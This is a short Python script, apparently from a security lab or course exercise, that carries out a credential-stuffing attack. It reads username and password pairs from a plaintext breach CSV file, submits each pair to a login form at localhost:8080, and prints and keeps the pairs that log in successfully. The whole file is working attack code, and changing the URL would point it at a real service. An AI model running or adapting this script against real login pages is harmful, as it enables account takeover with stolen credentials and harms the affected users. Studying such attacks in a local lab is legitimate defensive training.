from csv import reader
from requests import post, codes

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    correct = []
    i = 0
    while i < len(creds):
        if attempt_login(creds[i][0],creds[i][1]):
            print(creds[i])
            correct.append(creds[i])
        i += 1
    return correct

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    credential_stuffing_attack(creds)
    
if __name__ == "__main__":
    main()
